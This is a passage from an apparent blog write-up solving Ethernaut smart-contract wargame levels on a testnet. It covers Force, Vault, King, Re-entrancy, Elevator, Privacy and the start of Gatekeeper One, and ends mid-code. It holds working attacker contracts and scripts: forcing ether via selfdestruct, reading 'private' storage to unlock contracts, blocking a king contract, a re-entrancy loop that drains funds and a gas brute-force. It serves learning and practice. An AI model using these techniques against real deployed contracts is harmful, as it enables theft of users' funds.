</li>
</ol>
<p>Because the instance of the Force contract is already deployed, the easiest way we can complete the objective is through number 2.</p>
<h3 id="how-i-did-it-5">How I did it</h3>
<ol>
<li>Deploy an attacking contract called ForceAttack (at: <code>0xba2C7CAE436F3710500507d1f5cf07229C3d0C66</code>)</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">forceattack <span class="token operator">=</span> ForceAttack<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<p>And make sure the contract can receive funds and also has a function that calls <code>selfdestruct()</code> to the contract address of our instance:</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external payable <span class="token punctuation">{</span><span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">forceEtherIntoAddress</span><span class="token punctuation">(</span>address payable _to<span class="token punctuation">)</span> external onlyOwner <span class="token punctuation">{</span>
    <span class="token function">selfdestruct</span><span class="token punctuation">(</span>_to<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>I also optionally added a fallback <code>receive()</code> function and made the contract <code>Ownable</code> so that only I could call the <code>selfdestruct()</code> function (not that anyone would’ve done it anyway…)</p>
<ol start="2">
<li>Send some funds into the contract.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">forceattack<span class="token punctuation">.</span><span class="token builtin">reload</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">}</span> <span class="token operator">|</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xcd6a2d6d2e618742a61f919924ac1093fc92b942ee6b22ce95f5961505b9df49">https://rinkeby.etherscan.io/tx/0xcd6a2d6d2e618742a61f919924ac1093fc92b942ee6b22ce95f5961505b9df49</a></p>
<ol start="3">
<li>Call the function that calls <code>selfdestruct()</code> designating my instance address as the recipient of the funds.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">forceattack<span class="token punctuation">.</span>forceEtherIntoAddress<span class="token punctuation">(</span>force<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x936c5b1b5131c445f80eb7e38c1d1c766e8134a06c07613b07a7524f33da0faa">https://rinkeby.etherscan.io/tx/0x936c5b1b5131c445f80eb7e38c1d1c766e8134a06c07613b07a7524f33da0faa</a></p>
<ol start="4">
<li>Confirm that the contract balance is &gt; 0</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">balance_assertion <span class="token operator">=</span> force<span class="token punctuation">.</span>balance<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'Current balance of the contract is {force.balance()}, is this greater than zero: {balance_assertion}'</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-6">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xef8a1831aa8bec120b9c1fc966b254dc296a8f6eb23a72cf28545958fd0a07b2">https://rinkeby.etherscan.io/tx/0xef8a1831aa8bec120b9c1fc966b254dc296a8f6eb23a72cf28545958fd0a07b2</a></p>
<hr>
<h2 id="vault">Vault</h2>
<h3 id="objectives-6">Objectives</h3>
<p>Unlock the vault to pass the level!</p>
<h3 id="solution-6">Solution</h3>
<p>Sensitive data like passwords are not safe to store on the blockchain. Even in private variables, <em>Especially</em> if we have the source code of the contract, which is likely to be public in order to increase transparency and confidence in the piece of software, as the blockchain deals with actual money and as users we should always assume a closed source contract is trying to steal our funds.</p>
<p>In this case, the state variables are stored in the contract storage, and because the variable <code>password</code> is a 32 byte piece of data, it will always fill an entire slot, making its position very predictable in the 2nd slot of the contract, as the 2nd state variable defined.</p>
<p>In this case, we can easily use the function <code>get_storage_at()</code> on <a href="http://web3.py">web3.py</a> to see what the password is by looking up in the 2nd storage slot. Then we can optionally convert it to text to see what the password is. In this case, the password is:</p>
<pre class=" language-python"><code class="prism  language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> web3<span class="token punctuation">.</span>toText<span class="token punctuation">(</span>web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>get_storage_at<span class="token punctuation">(</span>vault<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token string">'0x01'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token string">'A very strong secret password :)'</span>
</code></pre>
<h3 id="how-i-did-it-6">How I did it</h3>
<ol>
<li>Get the password from the contract’s storage</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">password <span class="token operator">=</span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>get_storage_at<span class="token punctuation">(</span>EthernautInstances<span class="token punctuation">[</span><span class="token string">'vault'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'0x01'</span><span class="token punctuation">)</span>
</code></pre>
<ol start="2">
<li>Unlock the vault using the password</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">vault<span class="token punctuation">.</span>unlock<span class="token punctuation">(</span>password<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x03ec2e81ed977af2394d251f6fba6f25af30fb36bbcaaa98e59f04c40a57c81f">https://rinkeby.etherscan.io/tx/0x03ec2e81ed977af2394d251f6fba6f25af30fb36bbcaaa98e59f04c40a57c81f</a></p>
<ol start="3">
<li>Check if the vault is locked through the <code>locked</code> state variable</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">locked_assertion <span class="token operator">=</span> vault<span class="token punctuation">.</span>locked<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">False</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'Is the vault unlocked? {locked_assertion}'</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-7">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xfc76f78a068bb6b02333b7c64024f7416c658feeea3ac2fd6e51217db3b138c3">https://rinkeby.etherscan.io/tx/0xfc76f78a068bb6b02333b7c64024f7416c658feeea3ac2fd6e51217db3b138c3</a></p>
<hr>
<h2 id="king">King</h2>
<h3 id="objectives-7">Objectives</h3>
<p>When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.</p>
<h3 id="solution-7">Solution</h3>
<p>Here all we have to do is have a contract become <code>king</code> as opposed to an ordinary address. So we create a contract that performs a low level call to send the funds (because <code>transfer</code> would run out of gas) to the King contract. The amount to send has to be greater than or equal to 0.001 ETH (1e15 wei). Once the contract takes over as king, no other contract or address can take over.</p>
<h3 id="how-i-did-it-7">How I did it</h3>
<ol>
<li>Deploy the attacking contract KingAttack (at: <code>0x27eb59A15364a45a53AcB341514e0fcAf44BF0Ad</code>)</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">kingattack <span class="token operator">=</span> KingAttack<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>EthernautInstances<span class="token punctuation">[</span><span class="token string">'king'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<ol start="2">
<li>Call the <code>becomeKing()</code> function, while sending enough funds to take over the contract (1e15 wei = 0.001 ether) defined in the contract as follows:</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">becomeKing</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external payable <span class="token punctuation">{</span>
    <span class="token punctuation">(</span>bool success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">address</span><span class="token punctuation">(</span>kingContract<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"Transfer failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Calling it in python, we get the value directly from the King contract’s storage position 2, where the prize is located (located in position 2 because it is a uin256 which occupies a full slot and the first slot is occupied by an address, also 32 bytes).</p>
<pre class=" language-python"><code class="prism  language-python">kingattack<span class="token punctuation">.</span>becomeKing<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">(</span>web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>get_storage_at<span class="token punctuation">(</span>king<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token string">'0x01'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token operator">|</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xcb97566e0e4fbd7658eb587ba7d7418d54ce86830542dd567c23f73cb1b46873">https://rinkeby.etherscan.io/tx/0xcb97566e0e4fbd7658eb587ba7d7418d54ce86830542dd567c23f73cb1b46873</a></p>
<ol start="3">
<li>Check that we have actually become King</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">king_assertion <span class="token operator">=</span> king<span class="token punctuation">.</span>_king<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> kingattack<span class="token punctuation">.</span>address
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'The contract address {kingattack.address} is the king: {king_assertion}'</span><span class="token punctuation">)</span>
</code></pre>
<p>With the prior knowledge that the contract cannot be taken over by a normal address or another contract, we have effectively broken the takeover mechanism.</p>
<h3 id="submission-transaction-8">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x9124cf8bb5f0bc17806a8264443ac0b5a3b9ea22a49818af9d1205be9dbb6aec">https://rinkeby.etherscan.io/tx/0x9124cf8bb5f0bc17806a8264443ac0b5a3b9ea22a49818af9d1205be9dbb6aec</a></p>
<hr>
<h2 id="re-entrancy">Re-entrancy</h2>
<h3 id="objectives-8">Objectives</h3>
<p>The goal of this level is for you to steal all the funds from the contract.</p>
<h3 id="solution-8">Solution</h3>
<p>the Reentrance contract seems to only expect non-contract addresses to interact with it. When calling <code>donate()</code> through a contract and donating an amount of ETH, we can then call <code>withdraw()</code> and have another call to <code>withdraw()</code> as a fallback function where we attempt to withdraw the same amount that was sent during the donation. This allows our contract to withdraw once again from the Reentrance contract before it can actually update its balance, leading to a net loss of funds equal to the amount that was donated <em>per transaction</em>. If the contract had a larger amount of funds, we could basically repeat this same transaction as long as it is gas-efficient to do so and eventually deplete the contract’s funds.</p>
<h3 id="how-i-did-it-8">How I did it</h3>
<ol>
<li>Code and deploy a contract (at: <code>0xe2F7Cc547AE5F07C06DA81837877F0056Fb23B6a</code>) with 4 functions, one to donate, another one to withdraw and a last one being a fallback function that can receive funds <code>receive()</code>. The fallback function will call the <code>withdraw()</code> method from the Reentrance contract. Additionally, a 4th function that withdraws the attacking contract’s funds back to the deployer.</li>
</ol>
<p>2.We repeat the donate --&gt; withdraw process until the contract has been drained. In this case, the contract had a total of 0.001 ETH (1e15 wei) in it, so it can be done in a single loop. Despite this, I still wanted to use a while loop for illustrative/learning purposes.</p>
<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">while</span> reentrancy<span class="token punctuation">.</span>balance<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
    reentrancyattack<span class="token punctuation">.</span>donate<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token number">1e15</span><span class="token punctuation">}</span> <span class="token operator">|</span> _from<span class="token punctuation">)</span>
    reentrancyattack<span class="token punctuation">.</span>withdraw<span class="token punctuation">(</span><span class="token number">1e15</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x8382be6a150e53084ef3dddd1eddb2947f67f06ef78462762bee0da5e4706c92">https://rinkeby.etherscan.io/tx/0x8382be6a150e53084ef3dddd1eddb2947f67f06ef78462762bee0da5e4706c92</a></p>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xfd45877eea70901376b99b2bee25d924696adbe6cf3fa88aae2d9a58f579884e">https://rinkeby.etherscan.io/tx/0xfd45877eea70901376b99b2bee25d924696adbe6cf3fa88aae2d9a58f579884e</a></p>
<ol start="3">
<li>Recover the funds from the attacker contract and send them to the deployer (owner, me)</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">reentrancyattack<span class="token punctuation">.</span>withdrawAttackerContractFunds<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xbe8c59fba36d2911e1a82c38ad9b6b1790688af717a195cdc7de4270eeb71526">https://rinkeby.etherscan.io/tx/0xbe8c59fba36d2911e1a82c38ad9b6b1790688af717a195cdc7de4270eeb71526</a></p>
<ol start="4">
<li>Check if the contract has indeed been drained.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">balance_assertion <span class="token operator">=</span> reentrancy<span class="token punctuation">.</span>balance<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"The contract's balance is {reentrancy.balance()}, The contract is {'drained' if balance_assertion else 'not drained'}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-9">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xe704da1a83ed2a3ecf4b72876222c46dc65e9fe72b2ab5d4e1be2262698a73b8">https://rinkeby.etherscan.io/tx/0xe704da1a83ed2a3ecf4b72876222c46dc65e9fe72b2ab5d4e1be2262698a73b8</a></p>
<hr>
<h2 id="elevator">Elevator</h2>
<h3 id="objectives-9">Objectives</h3>
<p>This elevator won’t let you reach the top of your building. Right?</p>
<h3 id="solution-9">Solution</h3>
<p>The returning value of <code>isLastFloor()</code> must be False for <code>floor</code> to change and for <code>top</code> to become true. Two ways to do this come to mind:</p>
<ol>
<li>
<p>We make our top floor something that isn’t 0 (the starting value of <code>floor</code>) and we check if <code>floor</code> is the number value of the top floor. Then we define the function <code>isLastFloor()</code> to return a comparison between the current <code>floor</code> and the top floor value.</p>
</li>
<li>
<p>We make a function that sends the elevator to its current floor (0), but we run this function twice, the first time, we make sure that <code>isLastFloor()</code> returns false, and then after this only true. This would effectively mean that our top floor is the 0th floor. But during that second run, <code>top</code> becomes true.</p>
</li>
</ol>
<h3 id="how-i-did-it-9">How I did it</h3>
<ol>
<li>Create and deploy a Building contract (at: <code>0x970b299cCB253F5b4f58fEbde41Ffe2D2b25F885</code>) to interact with the Elevator contract where I define the <code>isLastFloor()</code> function:</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span>uint256<span class="token punctuation">)</span> external <span class="token function">returns</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    lastFloorBool <span class="token operator">=</span> elevatorContract<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> topFloor<span class="token punctuation">;</span>
    <span class="token keyword">return</span> lastFloorBool<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>And a function to go to the top floor which calls <code>goTo()</code> in the elevator contract:</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">goToTopFloor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external <span class="token punctuation">{</span>
    elevatorContract<span class="token punctuation">.</span><span class="token function">goTo</span><span class="token punctuation">(</span>topFloor<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ol start="2">
<li>Call the <code>goToTopFloor()</code> function which will first see that it’s not at the top floor (<code>floor</code> is 0 initially), then floor changes and <code>floor</code> = <code>topFloor</code> and the second time <code>isLastFloor()</code> is called returns <code>true</code> which is then assigned to <code>top</code>.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">building<span class="token punctuation">.</span>goToTopFloor<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x33bbab0e9b389cf24fb2118f1b07b350e53d8e358c36cbd94a536f9013fa386d">https://rinkeby.etherscan.io/tx/0x33bbab0e9b389cf24fb2118f1b07b350e53d8e358c36cbd94a536f9013fa386d</a></p>
<ol start="3">
<li>Check that <code>top</code> is true</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">top_assertion <span class="token operator">=</span> elevator<span class="token punctuation">.</span>top<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'We are at the top floor: {top_assertion}'</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-10">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x88d2597f20efca51b582e9ae46696320ab5fb77ae32aee5dc58a335ced32a9b2">https://rinkeby.etherscan.io/tx/0x88d2597f20efca51b582e9ae46696320ab5fb77ae32aee5dc58a335ced32a9b2</a></p>
<hr>
<h2 id="privacy">Privacy</h2>
<h3 id="objectives-10">Objectives</h3>
<p>Unlock this contract to beat the level.</p>
<h3 id="solution-10">Solution</h3>
<p>First, the data in the <code>data</code> variable must be retrieved. This can be done by extracting the data from the contract storage as it is on the blockchain. In brownie, this can be done using <code>web3.eth.get_storage_at()</code>, with the address of the contract in the first param and the direction of the contract storage slot to look into.</p>
<p>Each slot has a capacity of 32 bytes (256 bits), meaning that data types which actually fill up a 32 byte slot, are going to take up a whole slot, so the following ones roll over to the next slot. If a data type is declared as <code>uint256</code> or <code>bytes32</code>, it will always occupy a full storage slot, as these types are already 32 bytes in size.</p>
<p>In the case of the Privacy contract, we know that the relevant piece of data is the last element of the array <code>data</code>. Therefore, to extract this, we must determine <em>where</em> this piece of data is, in what storage slot.</p>
<p>This contract’s state variables are, in order:</p>
<pre class=" language-js"><code class="prism  language-js">bool <span class="token keyword">public</span> locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
uint256 <span class="token keyword">public</span> ID <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>
uint8 <span class="token keyword">private</span> flattening <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
uint8 <span class="token keyword">private</span> denomination <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
uint16 <span class="token keyword">private</span> awkwardness <span class="token operator">=</span> <span class="token function">uint16</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">;</span>
bytes32<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">private</span> data<span class="token punctuation">;</span>
</code></pre>
<p>Therefore, the storage looks a little like this:</p>

<table>
<thead>
<tr>
<th>slot number</th>
<th>object</th>
<th>content</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>locked</td>
<td>true</td>
</tr>
<tr>
<td>1</td>
<td>ID</td>
<td>block timestamp</td>
</tr>
<tr>
<td>2</td>
<td>flattening, denomination and awkwardness</td>
<td>uint16(now), 255, 100</td>
</tr>
<tr>
<td>3</td>
<td>data[0]</td>
<td>0x64a6f16b073f2385269a71e47d8ae45f47d73172c5c87510274dba78b584bbaa</td>
</tr>
<tr>
<td>4</td>
<td>data[1]</td>
<td>0x9a8835c8dd1948872493737460934d6db82def5f62b1108323a69dcff6391462</td>
</tr>
<tr>
<td>5</td>
<td>data[2]</td>
<td>0x1942e9d3378c23e90a2cc2f45bd4f1ec7f2fd8ed471d58024a3e1efe498c8ec5</td>
</tr>
</tbody>
</table><p>What we’re interested in is the <em>first 16 bytes of data[2]</em>, which is (in hex):</p>
<pre><code>1942e9d3378c23e90a2cc2f45bd4f1ec
</code></pre>
<p>So then after acquiring this, all that needs to be done is simply pass it as parameter to <code>unlock()</code>, which will cause <code>locked</code> to become false.</p>
<h3 id="how-i-did-it-10">How I did it</h3>
<p>Exactly as I described in <a href="#solution-10">solution</a>:</p>
<ol>
<li>Get the first 16 bytes of the data in the 5th storage position of the contract instance.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">data_2 <span class="token operator">=</span> web3<span class="token punctuation">.</span>toBytes<span class="token punctuation">(</span>hexstr<span class="token operator">=</span>web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>get_storage_at<span class="token punctuation">(</span>privacy<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token string">'0x5'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<ol start="2">
<li>Pass it to the <code>unlock()</code> function</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">privacy<span class="token punctuation">.</span>unlock<span class="token punctuation">(</span>data_2<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x654abd57f4c71ca865d05575f9ff6356aa2940d25541cf2f53347241d6dfb0d3">https://rinkeby.etherscan.io/tx/0x654abd57f4c71ca865d05575f9ff6356aa2940d25541cf2f53347241d6dfb0d3</a></p>
<ol start="3">
<li>Check that <code>locked</code> is false</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">locked_assertion <span class="token operator">=</span> privacy<span class="token punctuation">.</span>locked<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">False</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"The contract is unlocked: {locked_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-11">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x3e1f0abea2f84273b9a5c67b7c66562ce86601bd44ef835518ae05489d13ec96">https://rinkeby.etherscan.io/tx/0x3e1f0abea2f84273b9a5c67b7c66562ce86601bd44ef835518ae05489d13ec96</a></p>
<hr>
<h2 id="gatekeeper-one">Gatekeeper One</h2>
<h3 id="objectives-11">Objectives</h3>
<p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
<h3 id="solution-11">Solution</h3>
<p>This contract has 3 modifiers that must be passed in order to make <code>entrant</code> the origin of the tx (my address).</p>
<ol>
<li>
<p>The transaction calling <code>enter()</code> in GatekeeperOne has to be performed by a smart contract, so that <code>msg.sender</code> differs from <code>tx.origin</code> (address calling the contract that calls <code>enter()</code>).</p>
</li>
<li>
<p>The remaining gas (<code>gasleft()</code>) after the code as ran has to be a multiple of 8191. This can be done my performing an external call to the GatekeeperOne contract where we run the <code>enter()</code> function and additionally send both the gas needed to perform the instructions <em>and</em> a multiple of 8191. I coded it as follows:</p>
</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token punctuation">(</span>success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">address</span><span class="token punctuation">(</span>gko<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">{</span>
            gas<span class="token punctuation">:</span> additionalGas <span class="token operator">+</span> <span class="token number">10</span><span class="token operator">*</span><span class="token number">8191</span>
        <span class="token punctuation">}</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span>
            <span class="token string">'enter(bytes8)'</span><span class="token punctuation">,</span> 
            _modifiedTxOriginBytes
        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>where:</p>
<ul>
<li>
<p><code>additionalGas</code> is the gas sent that can vary and 10*8191 is a multiple of 8191</p>
</li>
<li>
<p><code>_modifiedTxOriginBytes</code> is <code>tx.origin</code> modified heavily in order to pass the third check.</p>
</li>
</ul>
<ol start="3">
<li>The check has 3 require statements where we must have a key of type <code>bytes8</code> which has certain characteristics in order to pass the require statements. In summary, <code>_gateKey</code> will pass if:</li>
</ol>
<ul>
<li><code>uint32(uint64(_gateKey))</code>, <code>uint16(uint64(_gateKey))</code> and <code>uint16(tx.origin)</code> are equal, but <code>uint64(_gateKey)</code> is not.</li>
</ul>
<p>In order to achieve this, we need to make some changes to <code>tx.origin</code> manually:</p>
<ul>
<li>
<p>Only keep the first 2 bytes: <code>0x98bCCA1C6023e3F851090e079030da43d9F229d1</code> --&gt; <code>0x00000000000000000000000000000000000029d1</code></p>
</li>
<li>
<p>Add at least one value within the zeros in the 8 byte range so that when we typecast into <code>uint64</code>, the second check passes, meaning that we need to add at least one hex number (0-9 or A-F) in any position marked with an X: <code>0x000000000000000000000000XXXXXXXX000029d1</code></p>
</li>
</ul>
<h3 id="how-i-did-it-11">How I did it</h3>
<ol>
<li>Code and deploy (at: <code>0xdcEae9bA04Ddb9Dfd5F9B589A0d8638e739cD01b</code>) an attacking contract where I create a function that will call <code>enter()</code> in the Gatekeeper One smart contract.</li>
</ol>
<p>The function takes a parameter <code>address</code> and then casts it into <code>uint64</code> and then into <code>bytes8</code> to pass it to <code>enter()</code>, as <code>enter()</code> takes a <code>bytes8</code> parameter.</p>
<p>The second parameter will be a number, it can be a <code>uint16</code> as we will deal with small values. This number will be the amount of gas that will be used by instructions in the Gatekeeper One contract call. A multiple of 8191 has to be added to this message call to the amount of additional gas passed through <code>additionalGas</code> in order to pass the 2nd check.</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">callEnter</span><span class="token punctuation">(</span>address _modifiedTxOrigin<span class="token punctuation">,</span> uint16 additionalGas<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">returns</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// modified tx origin is tx origin with tweaks to pass the require statements in `enter()`</span>
    bytes8 _modifiedTxOriginBytes <span class="token operator">=</span> <span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span>_modifiedTxOrigin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bool success<span class="token punctuation">;</span>

    <span class="token comment">// send a message call with a specific amount of gas + a multiple of 8191</span>
    <span class="token punctuation">(</span>success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">address</span><span class="token punctuation">(</span>gko<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">{</span>
        gas<span class="token punctuation">:</span> additionalGas <span class="token operator">+</span> <span class="token number">10</span><span class="token operator">*</span><span class="token number">8191</span>
    <span class="token punctuation">}</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span>
        <span class="token string">'enter(bytes8)'</span><span class="token punctuation">,</span> 
        _modifiedTxOriginBytes
    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// require success</span>
    <span class="token function">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">'call failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// return result of the success</span>
    <span class="token keyword">return</span> success<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ol start="2">
<li>Modify my address (the <code>tx.origin</code>, <code>0x98bCCA1C6023e3F851090e079030da43d9F229d1</code>) in order to pass the third check, in this case I used <code>0x0000000000000000000000000000000A000029d1</code>. This will pass all checks as described in <a href="#solution-11">solution</a>.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">modified_tx_origin <span class="token operator">=</span> f<span class="token string">"0x{'0'*31}A0000{acc.address[-4:]}"</span>
</code></pre>
<ol start="3">
<li>In order to find the cost of the instructions, I decided to bruteforce the message call until at least one transaction passed and then annotate the typical cost for it. It ended up usually being <code>211</code> or <code>254</code>. <code>bruteforce</code> is a parameter in my function used to solve the challenge, which if <code>True</code> will run the loop and execute 200+ txs to find the correct gas to input into <code>additionalGas</code>. Once I have the correct gas value, I input it in the else statement and make <code>bruteforce=False</code>.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">if</span> bruteforce<span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
